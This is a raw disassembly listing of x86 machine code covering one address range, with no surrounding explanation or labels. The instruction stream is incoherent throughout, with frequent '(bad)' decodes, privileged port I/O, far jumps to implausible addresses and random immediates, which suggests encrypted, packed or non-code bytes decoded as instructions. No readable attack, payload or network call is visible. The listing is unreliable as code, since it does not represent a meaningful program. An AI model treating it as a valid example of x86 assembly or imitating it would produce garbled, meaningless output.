  413f7c:	xor    al,0x37
  413f7e:	pushf  
  413f7f:	ret    0xd788
  413f82:	shl    BYTE PTR [edi-0x2a4f6c2d],cl
  413f88:	inc    eax
  413f89:	out    dx,eax
  413f8a:	xor    al,0xd0
  413f8c:	xchg   esp,eax
  413f8d:	rol    BYTE PTR [esi+0x67],0x62
  413f91:	sub    eax,DWORD PTR [ecx-0x39c5d232]
  413f97:	xor    BYTE PTR [edx+0x4b],ch
  413f9a:	mov    dh,BYTE PTR [ecx-0x47]
  413f9d:	mov    ecx,0x5618261f
  413fa2:	push   edx
  413fa3:	cmp    al,0xb0
  413fa5:	nop
  413fa6:	jnp    0x413f74
  413fa8:	not    DWORD PTR [esi+0x65]
  413fab:	fimul  WORD PTR [ebx+0x8]
  413fae:	das    
  413faf:	aad    0xba
  413fb1:	sar    esp,cl
  413fb3:	pop    fs
  413fb5:	add    DWORD PTR [edi-0x11ecd1cb],ecx
  413fbb:	outs   dx,BYTE PTR ds:[esi]
  413fbc:	xor    DWORD PTR [esi-0x70],ecx
  413fbf:	jnp    0x413f46
  413fc1:	mov    BYTE PTR [ebx],bl
  413fc3:	retf   0x7cfe
  413fc6:	test   BYTE PTR [edx],dl
  413fc8:	aaa    
  413fc9:	mov    ecx,0x9dd937d
  413fce:	(bad)  
  413fcf:	ret    0xe725
  413fd2:	push   esi
  413fd3:	pop    es
  413fd4:	leave  
  413fd5:	hlt    
  413fd6:	inc    ebx
  413fd7:	test   eax,0x523e76d9
  413fdc:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  413fde:	ret    
  413fdf:	jns    0x413f95
  413fe1:	aas    
  413fe2:	data16 in al,dx
  413fe4:	add    bl,BYTE PTR [eax-0x27]
  413fe7:	jle    0x413f6b
  413fe9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fea:	xor    BYTE PTR [edi],bh
  413fec:	nop
  413fed:	fwait
  413fee:	xor    DWORD PTR [esi-0x3],esp
  413ff1:	shr    DWORD PTR [esi],0x0
  413ff4:	lods   eax,DWORD PTR ds:[esi]
  413ff5:	int3   
  413ff6:	add    BYTE PTR [ebx-0x60a5ca16],0x62
  413ffd:	xor    ah,bl
  413fff:	mov    ah,0x23
  414001:	repnz cmp DWORD PTR [edx],0xcdfb637
  414008:	cwde   
  414009:	push   0xb77d3652
  41400e:	xlat   BYTE PTR ds:[ebx]
  41400f:	scas   al,BYTE PTR es:[edi]
  414010:	push   es
  414011:	pop    ebx
  414012:	aaa    
  414013:	mov    fs,WORD PTR ds:0x6deb7de7
  414019:	jmp    0x1320c639
  41401e:	push   ebx
  41401f:	rol    DWORD PTR [eax],cl
  414021:	xchg   ebp,eax
  414022:	(bad)  
  414023:	shr    DWORD PTR [esi+edi*2],cl
  414026:	mov    BYTE PTR [esi+ebp*1+0x7d432e5a],al
  41402d:	scas   al,BYTE PTR es:[edi]
  41402e:	cdq    
  41402f:	mov    ebp,0xf0d5b406
  414034:	bound  ebx,QWORD PTR [esi]
  414036:	repnz cdq 
  414038:	dec    BYTE PTR [esi+0x55a85ebb]
  41403e:	fwait
  41403f:	iret   
  414040:	jbe    0x413fd2
  414042:	test   al,0xb0
  414044:	call   0xa672278c
  414049:	sbb    ch,BYTE PTR [ecx+ebx*8+0xc]
  41404d:	aaa    
  41404e:	bound  ecx,QWORD PTR [eax+eax*1+0x2101e45b]
  414055:	out    dx,eax
  414056:	(bad)  
  414057:	cmp    eax,0x48283d6d
  41405c:	imul   edi,ecx,0x7b
  41405f:	dec    esi
  414060:	popa   
  414061:	mov    al,ds:0x658b9f28
  414066:	and    eax,0xe3661b85
  41406b:	arpl   WORD PTR [esi],si
  41406d:	sub    al,0x29
  41406f:	imul   ecx,DWORD PTR [esi],0x74
  414072:	inc    esi
  414073:	jbe    0x414060
  414075:	(bad)  
  414076:	pop    eax
  414077:	pop    ebx
  414078:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414079:	mov    dl,0x77
  41407b:	or     ch,BYTE PTR [ecx+esi*1]
  41407e:	mov    dl,0x57
  414080:	int3   
  414081:	and    al,0x5e
  414083:	out    dx,al
  414084:	enter  0x8c40,0xcb
  414088:	test   ebp,ecx
  41408a:	mov    bh,0x55
  41408c:	mov    esp,?
  41408e:	fwait
  41408f:	xchg   edx,eax
  414090:	cli    
  414091:	mov    ebx,0xaf75bc38
  414096:	out    dx,al
  414097:	ror    BYTE PTR [esi],cl
  414099:	push   ds
  41409a:	loop   0x4140ce
  41409c:	out    dx,al
  41409d:	js     0x414035
  41409f:	cld    
  4140a0:	imul   eax,DWORD PTR [eax-0x4e12c64d],0xd08c8479
  4140aa:	and    al,0xce
  4140ac:	fidiv  WORD PTR [esp+edx*8]
  4140af:	sub    al,0x5a
  4140b1:	imul   ebx,ebp,0x6fa1cf2a
  4140b7:	in     al,0x5e
  4140b9:	dec    esp
  4140ba:	and    al,0xc1
  4140bc:	cmp    eax,0x57b98ebc
  4140c1:	scas   al,BYTE PTR es:[edi]
  4140c2:	dec    edi
  4140c3:	sub    eax,0xac4782b4
  4140c8:	std    
  4140c9:	cs ss cmp al,0x2e
  4140cd:	mov    cl,0x1b
  4140cf:	pop    esp
  4140d0:	and    dh,BYTE PTR [esi+0x1b]
  4140d3:	cmp    al,0x55
  4140d5:	jp     0x414059
  4140d7:	push   ss
  4140d8:	push   eax
  4140d9:	cmp    al,0x19
  4140db:	and    eax,0xfdf628bb
  4140e0:	mov    cl,0x50
  4140e2:	fwait
  4140e3:	test   al,0xe4
  4140e5:	sbb    BYTE PTR [edi+eax*2+0x5092d56a],dl
  4140ec:	push   ss
  4140ed:	std    
  4140ee:	test   BYTE PTR [ebp+0x2a],dh
  4140f1:	mov    WORD PTR [ebp-0x3c],?
  4140f4:	cmp    edx,DWORD PTR [edx-0x77b5f96f]
  4140fa:	mov    ebx,0x880117c8
  4140ff:	inc    ecx
  414100:	inc    edi
  414101:	mov    ds:0x421e49fb,eax
  414106:	daa    
  414107:	sub    cl,BYTE PTR [ebx+0x2]
  41410a:	push   edx
  41410b:	dec    edi
  41410c:	cmp    al,0x7f
  41410e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41410f:	mov    ah,0x5d
  414111:	jmp    0x41416f
  414113:	pop    edi
  414114:	mov    ebx,0xc2ef469b
  414119:	mov    bh,0xb9
  41411b:	fst    QWORD PTR [ebp+0x51f69cbb]
  414121:	sbb    DWORD PTR [ecx],esp
  414123:	cs jle 0x414176
  414126:	push   es
  414127:	cmp    BYTE PTR [edx-0x557d9055],ch
  41412d:	mov    esi,0x4496ca4e
  414132:	fld    QWORD PTR [edi-0x36]
  414135:	or     eax,0xe04f133d
  41413a:	mov    ecx,DWORD PTR [eax-0x3d]
  41413d:	push   0x28
  41413f:	fs dec eax
  414141:	sub    DWORD PTR ds:0x8290acfd,ebx
  414147:	shr    DWORD PTR [ebp+eiz*8+0x2e],0xea
  41414c:	mov    al,bh
  41414e:	push   es
  41414f:	cs inc esi
  414151:	adc    BYTE PTR [esi],0xed
  414154:	push   esi
  414155:	icebp  
  414156:	adc    esi,DWORD PTR [ebx+0x632f75bf]
  41415c:	mov    edi,DWORD PTR [edx+0x69]
  41415f:	jmp    0xd079:0x5917578a
  414166:	inc    DWORD PTR [edi+esi*4]
  414169:	mov    dl,0xb
  41416b:	in     al,dx
  41416c:	fld    QWORD PTR [ebx+0x3cc1fd8a]
  414172:	jns    0x414110
  414174:	adc    DWORD PTR [ecx-0x66fa6ca4],ebp
  41417a:	inc    esi
  41417b:	stc    
  41417c:	mov    ds:0x9abaf3fd,al
  414181:	lea    esi,[ebp+0x49]
  414184:	push   0x45
  414186:	cs sub eax,0xcf8cf782
  41418c:	loopne 0x41412f
  41418e:	stc    
  41418f:	adc    edi,ebp
  414191:	mov    esp,0x7840c3d5
  414196:	push   0xffffffc4
  414198:	adc    al,0xc5
  41419a:	in     al,dx
  41419b:	push   ecx
  41419c:	add    dl,BYTE PTR [ebp+0x1]
  41419f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141a0:	mov    BYTE PTR [edx+ebp*8],dl
  4141a3:	enter  0x6a2e,0x25
  4141a7:	pop    es
  4141a8:	ss in  eax,dx
  4141aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141ab:	sahf   
  4141ac:	mov    al,ds:0xc34417d0
  4141b1:	popa   
  4141b2:	outs   dx,BYTE PTR ds:[esi]
  4141b3:	repz aas 
  4141b5:	das    
  4141b6:	xchg   ebx,eax
  4141b7:	pop    ds
  4141b8:	xor    eax,0x33734663
  4141bd:	js     0x41423e
  4141bf:	jmp    0x41423d
  4141c1:	sbb    BYTE PTR [eax],ch
  4141c3:	pop    eax
  4141c4:	in     al,0x56
  4141c6:	or     cl,BYTE PTR [eax-0x235afbc3]
  4141cc:	pop    eax
  4141cd:	fld    QWORD PTR [ebx]
  4141cf:	pop    ss
  4141d0:	xchg   esp,eax
  4141d1:	nop
  4141d2:	(bad)  
  4141d3:	mov    cl,0xcc
  4141d5:	or     eax,0xd1ef902d
  4141da:	cmc    
  4141db:	outs   dx,BYTE PTR ds:[esi]
  4141dc:	fs pusha 
  4141de:	stos   DWORD PTR es:[edi],eax
  4141df:	push   ecx
  4141e1:	ficomp WORD PTR [eax-0x7c]
  4141e4:	loop   0x41419d
  4141e6:	push   ss
  4141e7:	fwait
  4141e8:	sbb    al,0x8a
  4141ea:	inc    ecx
  4141eb:	iret   
  4141ec:	jo     0x4141d4
  4141ee:	fucomip st,st(5)
  4141f0:	out    0x52,al
  4141f2:	xor    al,al
  4141f4:	pop    ebx
  4141f5:	cs xchg esp,eax
  4141f7:	in     eax,0x1e
  4141f9:	sbb    ebx,DWORD PTR [edi+ebx*8]
  4141fc:	push   es
  4141fd:	outs   dx,BYTE PTR ds:[esi]
  4141fe:	push   es
  4141ff:	xor    DWORD PTR [eax-0x73dc8ab0],esi
  414205:	mov    ebx,0xba6fb5dc
  41420a:	mov    ebp,0x26c4cd65
  41420f:	xor    eax,0x4b8fb453
  414214:	push   ebx
  414215:	fwait
  414216:	cmp    ch,BYTE PTR [edi-0x11600e56]
  41421c:	leave  
  41421d:	std    
  41421e:	ret    
  41421f:	addr16 push edi
  414222:	push   ds
  414223:	xor    esp,DWORD PTR [esi]
  414225:	adc    al,0xd4
  414227:	xchg   edi,eax
  414228:	ins    BYTE PTR es:[edi],dx
  414229:	(bad)  
  41422a:	cmp    dl,BYTE PTR [ebx]
  41422c:	cmp    DWORD PTR [esi+0x5],ecx
  41422f:	(bad)
  414233:	jp     0x4141d6
  414235:	cmp    BYTE PTR ds:0xb8ca172f,bl
  41423b:	outs   dx,BYTE PTR ds:[esi]
  41423c:	jo     0x414240
  41423e:	dec    edi
  41423f:	or     al,BYTE PTR [ecx-0x5e]
  414242:	mov    ax,0x67cd
  414246:	push   es
  414247:	and    ebp,ebp
  414249:	push   ds
  41424a:	imul   esi,DWORD PTR [ebx-0x71],0x60
  41424e:	inc    ecx
  41424f:	js     0x414201
  414251:	in     al,0x3
  414253:	fcom   QWORD PTR [ebx-0x29d72987]
  414259:	xor    BYTE PTR ds:0x3b3d3329,cl
  41425f:	mov    ds:0x807ff44f,eax
  414264:	outs   dx,DWORD PTR ds:[esi]
  414265:	sti    
  414266:	neg    BYTE PTR [ebx-0x48bc23b0]
  41426c:	out    dx,eax
  41426d:	outs   dx,DWORD PTR ds:[esi]
  41426e:	cli    
  41426f:	fs mov bl,0xcc
  414272:	jle    0x414274
  414274:	pop    edi
  414275:	adc    DWORD PTR [ebp-0x1d5a77c7],eax
  41427b:	pop    edx
  41427c:	cmp    ebx,DWORD PTR [esi]
  41427e:	stc    
  41427f:	inc    eax
  414280:	ret    0x6171
  414283:	xor    BYTE PTR [edx+0x4b9c4ed1],bl
  414289:	cmc    
  41428a:	sbb    BYTE PTR ds:0xdcd83de7,bh
  414290:	out    0x92,eax
  414292:	xchg   BYTE PTR [ebx-0x1d44a3b5],dh
  414298:	mov    dh,0xfb
  41429a:	pop    ecx
  41429b:	mov    ebx,0xf76e4dd2
  4142a0:	pop    ebx
  4142a1:	or     BYTE PTR [ebx+ebx*8-0x53473418],dh
  4142a8:	nop
  4142a9:	stos   DWORD PTR es:[edi],eax
  4142aa:	sub    al,0x97
  4142ac:	push   esi
  4142ad:	ins    DWORD PTR es:[edi],dx
  4142ae:	les    ebx,FWORD PTR [ebp+0x1ee724e1]
  4142b4:	or     BYTE PTR [ecx+0x9a68d8c],al
  4142ba:	push   ds
  4142bb:	test   DWORD PTR [edi],ebp
  4142bd:	loop   0x414251
  4142bf:	sub    DWORD PTR [esi+0x1f614552],edx
  4142c5:	xlat   BYTE PTR ds:[ebx]
  4142c6:	jle    0x41425e
  4142c8:	lea    eax,[esi+0x34]
  4142cb:	sbb    BYTE PTR [edx+0x33735018],0x43
  4142d2:	cmp    dh,BYTE PTR [eax+edi*8-0x12]
  4142d6:	mov    ch,0x66
  4142d8:	sbb    dh,BYTE PTR [ebx+0x45]
  4142db:	lock out dx,al
  4142dd:	in     eax,0x4e
  4142df:	dec    ebp
  4142e0:	es into 
  4142e2:	fisttp QWORD PTR [ebx+0x599d0916]
  4142e8:	ja     0x41426e
  4142ea:	jp     0x414334
  4142ec:	add    edi,DWORD PTR [eax+0x34]
  4142ef:	neg    DWORD PTR [ecx]
  4142f1:	cmp    eax,0xb345ce7d
  4142f6:	and    bl,cl
  4142f8:	iret   
  4142f9:	add    ah,0xa0
  4142fc:	pop    ss
  4142fd:	das    
  4142fe:	inc    edx
  4142ff:	mov    esp,0x4e91811
  414304:	pop    eax
  414305:	xchg   edi,eax
  414306:	push   esi
  414307:	or     esp,DWORD PTR [edi-0x174128da]
  41430d:	mov    edx,0x7d64d657
  414312:	loop   0x4142f5
  414314:	pop    eax
  414315:	in     eax,dx
  414316:	inc    esi
  414317:	das    
  414318:	pop    ebx
  414319:	je     0x4142fe
  41431b:	das    
  41431c:	out    dx,eax
  41431d:	jbe    0x414349
  41431f:	add    dl,bh
  414321:	sti    
  414322:	mov    ds:0xabbc12b9,al
  414327:	repz xchg edx,eax
  414329:	div    BYTE PTR [eax-0x5e]
  41432c:	out    0x8e,eax
  41432e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41432f:	xchg   esp,eax
  414330:	jno    0x41438e
  414332:	sbb    cl,BYTE PTR [esi-0x129a72d7]
  414338:	jno    0x414332
  41433a:	push   edx
  41433b:	jnp    0x4143b9
  41433d:	stos   DWORD PTR es:[edi],eax
  41433e:	(bad)  
  41433f:	jne    0x41432e
  414341:	out    dx,al
  414342:	test   eax,0x9164bbf
  414347:	or     dl,bh
  414349:	push   cs
  41434a:	pop    ebx
  41434b:	loop   0x4143cb
  41434d:	aad    0x77
  41434f:	sti    
  414350:	cmp    edx,DWORD PTR [ecx+0x5e6c821c]
  414356:	mov    al,0x32
  414358:	push   0xffffff89
  41435a:	repz mov WORD PTR [ecx],?
  41435d:	gs popf 
  41435f:	pop    edi
  414360:	les    eax,FWORD PTR [ebp-0x4b756588]
  414366:	mov    cx,si
  414369:	sub    al,0x47
  41436b:	mov    ebp,0xdcbc9551
  414370:	fs adc eax,0x312441f4
  414376:	aam    0xe6
  414378:	icebp  
  414379:	push   ss
  41437a:	xchg   bh,bh
  41437c:	push   edx
  41437d:	mov    edi,0xfd70854e
  414382:	aas    
  414383:	retf   0x5b79
  414386:	ret    0x67d
  414389:	cmp    DWORD PTR [eax+0x66],eax
  41438c:	sub    ebp,esi
  41438e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41438f:	or     BYTE PTR [ecx+0x2c],0xe
  414393:	jno    0x4143b2
  414395:	push   ss
  414396:	les    ebx,FWORD PTR [eax+0x76d67088]
  41439c:	sbb    eax,0xae3f2809
  4143a1:	or     eax,0xa132367b
  4143a6:	and    ch,BYTE PTR ds:0xd32bba07
  4143ac:	mov    al,0xb4
  4143ae:	inc    ebp
  4143af:	hlt    
  4143b0:	jmp    0x4143ae
  4143b2:	cmp    al,ah
  4143b4:	lods   al,BYTE PTR ds:[esi]
  4143b5:	sbb    ebp,DWORD PTR [esi+ebp*4-0x51]
  4143b9:	xlat   BYTE PTR ds:[ebx]
  4143ba:	push   ss
  4143bb:	not    BYTE PTR [esi]
  4143bd:	(bad)  
  4143bf:	sbb    al,0xd0
  4143c1:	loopne 0x4143e2
  4143c3:	cmp    cl,BYTE PTR [esi+0x17]
  4143c6:	sub    eax,0x5f8f60a6
  4143cb:	cmp    BYTE PTR [esi],0xfc
  4143ce:	mov    ch,0xaf
  4143d0:	sbb    DWORD PTR [ebx-0x855ba14],edx
  4143d6:	arpl   si,bx
  4143d8:	xchg   ecx,eax
  4143d9:	push   ebx
  4143da:	xchg   esi,eax
  4143db:	lock mov bl,BYTE PTR [eax]
  4143de:	push   edi
  4143df:	inc    ebp
  4143e0:	sbb    edx,DWORD PTR [ebx+0x6e085cfa]
  4143e6:	lahf   
  4143e7:	je     0x414403
  4143e9:	mov    fs,WORD PTR [ecx+0x4079809]
  4143ef:	arpl   WORD PTR [esp+edx*1+0x5c],ax
  4143f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143f4:	adc    edx,DWORD PTR ss:[eax]
  4143f7:	les    ebx,FWORD PTR [ebx-0x53]
  4143fa:	je     0x4143e9
  4143fc:	cmp    eax,0xe3201021
  414401:	(bad)  
  414402:	fist   DWORD PTR [ebx+ecx*8+0x47]
  414406:	out    dx,al
  414407:	xchg   ecx,eax
  414408:	sar    DWORD PTR [ebx+0x5ee1f70f],1
  41440e:	into   
  41440f:	jnp    0x414395
  414411:	test   al,0xa4
  414413:	inc    ecx
  414414:	pop    ds
  414415:	pop    eax
  414416:	mov    al,0x81
  414418:	adc    DWORD PTR [ecx-0x5029e921],eax
  41441e:	and    al,0x8
  414420:	gs jb  0x41440d
  414423:	cs or  eax,0x9d08887e
  414429:	mov    dl,0x5e
  41442b:	mov    ah,0x3b
  41442d:	push   ecx
  41442e:	bound  ebp,QWORD PTR [edi]
  414430:	cmp    esi,ebp
  414432:	jecxz  0x4143da
  414434:	jnp    0x414464
  414436:	sti    
  414437:	daa    
  414438:	scas   eax,DWORD PTR es:[edi]
  414439:	fwait
  41443a:	jno    0x414449
  41443c:	inc    eax
  41443d:	fsubr  DWORD PTR [edx]
  41443f:	fsubr  QWORD PTR [edi]
  414441:	fldz   
  414443:	push   cs
  414444:	daa    
  414445:	cmp    DWORD PTR [esi+0x57],edx
  414448:	ds dec ecx
  41444a:	bound  ecx,QWORD PTR [ebx]
  41444c:	adc    ch,BYTE PTR [ebx+edi*1-0x28]
  414450:	adc    al,0xf1
  414452:	or     al,0x18
  414454:	pop    esp
  414455:	clc    
  414456:	ret    0xe00d
  414459:	and    edi,DWORD PTR [ecx]
  41445b:	jno    0x414474
  41445d:	setge  BYTE PTR [ebp-0x250dc2cc]
  414464:	jecxz  0x414478
  414466:	and    BYTE PTR [ecx-0x3737c47c],0x79
  41446d:	into   
  41446e:	push   cs
  41446f:	cmp    BYTE PTR [edx+0x8df69f],cl
  414475:	mov    al,ds:0xf136e6c6
  41447a:	gs je  0x41449b
  41447d:	popa   
  41447e:	mov    dl,0x9d
  414480:	arpl   WORD PTR [edx],bx
  414482:	dec    ecx
  414483:	(bad)  
  414484:	or     eax,0xb2f21640
  414489:	mul    dl
  41448b:	into   
  41448c:	(bad)  
  41448d:	mov    bl,0x34
  41448f:	xlat   BYTE PTR ds:[ebx]
  414490:	jnp    0x41446a
  414492:	mov    edi,0x73d1770a
  414497:	xor    eax,0xe1b4c73
  41449c:	clc    
  41449d:	faddp  st(5),st
  41449f:	pusha  
  4144a0:	stc    
  4144a1:	sti    
  4144a2:	xchg   esi,eax
  4144a3:	(bad)  
  4144a4:	pushf  
  4144a5:	inc    edi
  4144a6:	mov    WORD PTR [ecx+esi*4],?
  4144a9:	cs fwait
  4144ab:	push   esp
  4144ac:	mov    BYTE PTR [edx+ecx*4+0x55],al
  4144b0:	data16 loop 0x414447
  4144b3:	retf   
  4144b4:	shl    DWORD PTR [eax-0x19],0xbe
  4144b8:	push   es
  4144b9:	pop    ebp
  4144ba:	loope  0x414519
  4144bc:	aam    0xd0
  4144be:	loop   0x4144de
  4144c0:	std    
  4144c1:	jge    0x414532
  4144c3:	(bad)  
  4144c4:	mov    bl,0x47
  4144c6:	inc    eax
  4144c7:	push   es
  4144c8:	jl     0x414454
  4144ca:	in     eax,dx
  4144cb:	or     BYTE PTR [esi],ah
  4144cd:	ja     0x41452e
  4144cf:	inc    edi
  4144d0:	mov    BYTE PTR [esi-0x30],ah
  4144d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144d4:	adc    BYTE PTR [esi],ch
  4144d6:	sub    edi,DWORD PTR [edx+edi*4-0x54]
  4144da:	rol    esp,0x54
  4144dd:	and    edi,DWORD PTR [ebp-0x138b2b1a]
  4144e3:	xchg   edi,eax
  4144e4:	fadd   st(7),st
  4144e6:	in     eax,dx
  4144e7:	sbb    BYTE PTR [ecx+esi*2+0x4a],ah
  4144eb:	sbb    eax,ebp
  4144ed:	shl    BYTE PTR [edx+ebp*2+0x57],0x9d
  4144f2:	retf   
  4144f3:	or     bh,BYTE PTR [esi+0x4aca1c14]
  4144f9:	mov    ch,0xb5
  4144fb:	cli    
  4144fc:	xchg   edx,eax
  4144fd:	lods   eax,DWORD PTR ds:[esi]
  4144fe:	rol    DWORD PTR [edi],0x11
  414501:	aam    0x80
  414503:	dec    eax
  414504:	jo     0x414513
  414506:	inc    edi
  414507:	dec    BYTE PTR [eax+0x3]
  41450a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41450b:	mov    cl,0x51
  41450d:	int3   
  41450e:	lock int3 
  414510:	mov    eax,ds:0x67f3dbed
  414515:	ficomp DWORD PTR [edx+esi*4]
  414518:	fst    QWORD PTR [ebx-0x25]
  41451b:	fs sbb bl,al
  41451e:	xchg   ebp,eax
  41451f:	and    eax,DWORD PTR [ebp-0x12ae39c3]
  414525:	mov    ebx,0x8c4014b7
  41452a:	shl    DWORD PTR [esi+0x6c],1
  41452d:	fstp   QWORD PTR [ebp+edx*2+0x29]
  414531:	mov    edi,DWORD PTR [edi+0x2019eb69]
  414537:	in     eax,0xeb
  414539:	sub    eax,0x29484006
  41453e:	retf   
  41453f:	mov    ds:0xed8b0593,eax
  414544:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414545:	ins    BYTE PTR es:[edi],dx
  414546:	test   BYTE PTR [ecx],0xf5
  414549:	in     al,0xdc
  41454b:	jl     0x4145a5
  41454d:	hlt    
  41454e:	test   al,0x87
  414550:	pushf  
  414551:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414552:	fsubr  DWORD PTR [edx+ecx*1-0x79]
  414556:	pop    eax
  414557:	pmaddwd mm3,QWORD PTR [esp+edi*4+0x0]
  41455c:	(bad)  
  41455d:	and    bh,ch
  41455f:	sbb    eax,0xb9bb7dc1
  414564:	xor    eax,0x643c4e40
  414569:	addr16 fwait
  41456b:	sub    al,0x10
  41456d:	out    0x1e,eax
  41456f:	and    ch,BYTE PTR ds:0xe1b009a
  414575:	and    al,al
  414577:	mov    ds:0x3e768edb,al
  41457c:	and    bh,dh
  41457e:	mov    BYTE PTR [ebp-0x3f26918c],al
  414584:	sbb    al,0xe2
  414586:	setl   dh
  414589:	ret    0x171e
  41458c:	gs scas al,BYTE PTR es:[edi]
  41458e:	pop    es
  41458f:	call   0xf233:0x732f6e55
  414596:	cmp    eax,0x9143b421
  41459b:	mov    cl,0xc3
  41459d:	mov    edx,0xa3f690fa
  4145a2:	jle    0x41452f
  4145a4:	lahf   
  4145a5:	xor    al,0x60
  4145a7:	push   es
  4145a8:	mov    DWORD PTR [ecx-0x627f4f30],esp
  4145ae:	adc    al,0xc9
  4145b0:	mov    esp,DWORD PTR [ebx]
  4145b2:	push   cs
  4145b3:	fprem  
  4145b5:	call   0x347718f7
  4145ba:	lds    ebx,FWORD PTR [ebx-0x6d30e585]
  4145c0:	aas    
  4145c1:	aaa    
  4145c2:	or     edi,0x32
  4145c5:	(bad)  
  4145c6:	mov    eax,esp
  4145c8:	das    
  4145c9:	pop    ecx
  4145ca:	pop    eax
  4145cb:	fmul   st(5),st
  4145cd:	push   esp
  4145ce:	fst    QWORD PTR [edx]
  4145d0:	jmp    0xb1871ca1
  4145d5:	push   eax
  4145d6:	and    ax,0xf112
  4145da:	lods   al,BYTE PTR ds:[esi]
  4145db:	pop    ss
  4145dc:	call   0xc3cb:0x4ffd33d
  4145e3:	fsub   st,st(5)
  4145e5:	loopne 0x41456c
  4145e7:	sahf   
  4145e8:	daa    
  4145e9:	or     dh,0x85
  4145ec:	or     eax,0xfecc7b43
  4145f1:	lods   al,BYTE PTR ds:[esi]
  4145f2:	dec    DWORD PTR [ebx]
  4145f4:	pop    es
  4145f5:	fistp  QWORD PTR [bx+0x5032]
  4145fa:	xor    BYTE PTR [eax],0xe
  4145fd:	inc    edi
  4145fe:	adc    esi,DWORD PTR [edi]
  414600:	sbb    BYTE PTR [ecx-0x29],0x55
  414604:	test   al,0x89
  414606:	ins    DWORD PTR es:[edi],dx
  414607:	pop    ebx
  414608:	or     edx,ebx
  41460a:	add    al,0x7d
  41460c:	mov    esi,0x58b29c1c
  414611:	idiv   esi
  414613:	in     al,dx
  414614:	and    ebx,DWORD PTR [edi+0x67db3eff]
  41461a:	mov    eax,ds:0xe8f98978
  41461f:	stos   DWORD PTR es:[edi],eax
  414620:	fst    DWORD PTR [esi+0x73ad12d]
  414626:	jne    0x41468c
  414628:	mov    ds:0xfdf4c235,al
  41462d:	adc    dh,BYTE PTR [ebp-0x1ccbedb9]
  414633:	adc    cl,al
  414635:	and    BYTE PTR ds:0xeb535c1b,dh
  41463b:	int    0x86
  41463d:	pop    ebp
  41463e:	add    eax,0x24ca546e
  414643:	leave  
  414644:	add    al,0x4e
  414646:	push   ebx
  414647:	fmul   DWORD PTR [ebp+0x19]
  41464a:	fs jge 0x4146c8
  41464d:	xchg   edx,eax
  41464e:	or     dl,BYTE PTR [edi-0x26]
  414651:	arpl   WORD PTR [esi*1-0x7f1afbee],si
  414658:	sub    DWORD PTR [eax+0x4a1ea1ea],0xffffffa0
  41465f:	dec    edx
  414660:	jle    0x41461e
  414662:	mov    DWORD PTR [edi+0x29],edx
  414665:	dec    esp
  414666:	dec    eax
  414667:	adc    al,0xd9
  41466a:	jmp    0x89c2:0x7f6c9f9c
  414671:	push   ebx
  414672:	jle    0x414697
  414674:	mov    ecx,0x5a33ef4c
  414679:	dec    ebp
  41467a:	push   esp
  41467b:	rcl    edx,cl
  41467d:	pushf  
  41467e:	xor    eax,0x77530560
  414683:	or     ebp,ebx
  414685:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414686:	mov    esi,0x56f13499
  41468b:	push   eax
  41468c:	in     al,dx
  41468d:	push   cs
  41468e:	or     DWORD PTR [ebp+eax*4+0x6c],esi
  414692:	or     BYTE PTR ds:0xbf0af094,dl
  414698:	pop    ebx
  414699:	pop    ds
  41469a:	inc    esi
  41469b:	dec    ebp
  41469c:	adc    BYTE PTR [ecx],bl
  41469e:	fimul  WORD PTR [eax]
  4146a0:	pop    eax
  4146a1:	pop    edi
  4146a2:	aas    
  4146a3:	xchg   esp,eax
  4146a4:	fprem1 
  4146a6:	or     DWORD PTR [ebp-0x25],ebx
  4146a9:	mov    ebp,0x104dfa2b
  4146ae:	xchg   ecx,eax
  4146af:	push   esp
  4146b0:	test   BYTE PTR [edx],al
  4146b2:	pushf  
  4146b3:	pop    esp
  4146b4:	sbb    BYTE PTR [ebx],bh
  4146b6:	jmp    0x1ff726a4
  4146bb:	leave  
  4146bc:	pushf  
  4146bd:	(bad)
  4146c0:	(bad)  
  4146c1:	dec    esp
  4146c2:	clc    
  4146c3:	aaa    
  4146c4:	setnp  BYTE PTR [ecx+0x5]
  4146c8:	jnp    0x414659
  4146ca:	lahf   
  4146cb:	rol    dh,0x1b
  4146ce:	push   bp
  4146d0:	jo     0x414733
  4146d2:	loop   0x414670
  4146d4:	test   ah,0xaa
  4146d7:	repz repnz xlat BYTE PTR ds:[ebx]
  4146da:	inc    esi
  4146db:	in     eax,0xcb
  4146dd:	int    0x10
  4146df:	xor    eax,0xa7305ac7
  4146e4:	test   eax,0x742a5943
  4146e9:	xchg   ebp,eax
  4146ea:	aad    0xf5
  4146ec:	adc    DWORD PTR [ecx],edx
  4146ee:	stos   BYTE PTR es:[edi],al
  4146ef:	mov    edx,0x5ac449f
  4146f4:	scas   al,BYTE PTR es:[edi]
  4146f5:	xchg   ebp,eax
  4146f6:	(bad)  
  4146f7:	ins    DWORD PTR es:[edi],dx
  4146f8:	mov    esi,0xea9b0a
  4146fd:	or     al,0x73
  4146ff:	outs   dx,DWORD PTR ds:[esi]
  414700:	dec    esp
  414701:	into   
  414702:	ja     0x4146a4
  414704:	jo     0x41468e
  414706:	sbb    ebp,ecx
  414708:	or     al,0x5f
  41470a:	adc    eax,0x74bda1ad
  41470f:	out    0x2e,al
  414711:	div    BYTE PTR [ebx]
  414713:	aam    0x22
  414715:	stos   DWORD PTR es:[edi],eax
  414716:	adc    BYTE PTR [ebx],0x68
  414719:	daa    
  41471a:	xlat   BYTE PTR ds:[ebx]
  41471b:	ins    BYTE PTR es:[edi],dx
  41471c:	cmp    bl,ch
  41471e:	xchg   edi,eax
  41471f:	pop    DWORD PTR [ecx+0xe248d7e]
  414725:	pop    edi
  414726:	mov    ds:0x6238e4d,al
  41472b:	xor    BYTE PTR [edx],dl
  41472d:	sbb    BYTE PTR [edx-0x76],ch
  414730:	xor    ch,bh
